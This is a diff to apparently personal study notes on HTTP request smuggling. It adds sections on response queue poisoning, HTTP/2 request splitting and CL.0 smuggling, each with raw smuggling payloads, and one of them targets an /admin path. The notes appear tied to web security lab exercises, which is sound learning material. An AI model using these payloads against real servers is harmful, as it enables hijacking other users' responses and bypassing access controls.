@@ -1,6 +1,6 @@
 # HTTP request smuggling
 
-## HTTP request smuggling
+HTTP request smuggling
 
 <details>
 
@@ -12,7 +12,7 @@
 
 * Modern web apps often use chains of HTTP servers, with users sending requests to a front-end server (sometimes referred to as a load balancer or reverse proxy), which in turn forwards requests to multiple back-end servers.
 
-- Front-end and back-end systems must agree on request boundaries to prevent ambiguous requests that attackers can exploit
+- Front-end and back-end systems must agree on request boundaries to prevent ambiguous requests that attackers can exploit.
 
 </details>
 
@@ -265,6 +265,10 @@ Content-Length: 650
 csrf=ihmEx8D&postId=1&name=test&email=test@test.test&comment=
 ```
 
+{% hint style="info" %}
+**Note**: One limitation with this technique is that it will generally only capture data up until the parameter delimiter that is applicable for the smuggled request. For URL-encoded form submissions, this will be the `&` character, meaning that the content that is stored from the victim user's request will end at the first `&`, which might even appear in the query string
+{% endhint %}
+
 ### <mark style="color:yellow;">Exploit reflected XSS</mark>
 
 <mark style="color:yellow;">**CL.TE**</mark>
@@ -410,6 +414,114 @@ Foo: x
 {% hint style="info" %}
 **Note**: to inject newlines into HTTP/2 headers, in burp use the Inspector to drill down into the header, then press the `Shift + Return` keys.
 {% endhint %}
+
+## <mark style="color:yellow;">Response queue poisoning</mark>
+
+<details>
+
+<summary>Theory (in short)</summary>
+
+When you smuggle a complete request, the front-end server processes a single request, but the back-end sees two requests and sends two responses. The front-end forwards the first response correctly but queues the unexpected second response. When a new request arrives, the front-end mistakenly sends the leftover response from the smuggled request, leaving the correct back-end response unmatched. This cycle repeats, disrupting the response flow for subsequent requests.
+
+</details>
+
+You need to smuggle a complete request.
+
+**Front-end (CL)**
+
+```http
+POST / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+Content-Type: x-www-form-urlencoded\r\n
+Content-Length: 61\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+GET /anything HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n
+GET / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n
+```
+
+**Back-end (TE)**
+
+```http
+POST / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+Content-Type: x-www-form-urlencoded\r\n
+Content-Length: 61\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+GET /anything HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n
+GET / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n
+```
+
+## <mark style="color:yellow;">HTTP/2 request splitting</mark>
+
+This approach is more versatile, allowing even GET requests without relying on methods that support a body.
+
+```http
+:method	        GET
+:path	        /
+:authority	vulnerable-website.com
+foo	        bar\r\n
+                \r\n
+                GET /admin HTTP/1.1\r\n
+                Host: vulnerable-website.com
+```
+
+During rewriting, some front-end servers append the new `Host` header after existing ones. With HTTP/2, this places it after the `foo` header, leaving the first request without a `Host` header and the smuggled one with two. Inject your `Host` header so that it ends up in the first request once.
+
+```
+:method	        GET
+:path	        /
+:authority	vulnerable-website.com
+foo	        bar\r\n
+                Host: vulnerable-website.com\r\n
+                \r\n
+                GET /admin HTTP/1.1
+```
+
+{% hint style="info" %}
+**Note**: here the request triggerg response queue poisoning, but you can also smuggle prefixes for classic request smuggling.
+{% endhint %}
+
+## <mark style="color:yellow;">CL.0/H2.0 request smuggling</mark>
+
+Some servers ignore the `Content-Length` header, treating requests as ending at the headers, effectively making `Content-Length 0`. If the back-end behaves this way while the front-end uses Content-Length, this discrepancy enables HTTP request smuggling, termed a "CL.0" vulnerability.
+
+**Find an endpoint that ignores Content-Length**
+
+* POST request to a static file
+* POST request to server level redirect (`Location` header in the response)
+* POST request that triggers a server side error
+
+**Exploitation**
+
+1. Create one tab containing the setup request and another containing an arbitrary follow-up request.
+2. Add the two tabs to a group in the correct order.
+3. Change the Connection header to `keep-alive`.
+4. Send group in sequence (single connection)
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: CORRECT
+
+GET /404 HTTP/1.1
+Foo: x
+```
 
 
 
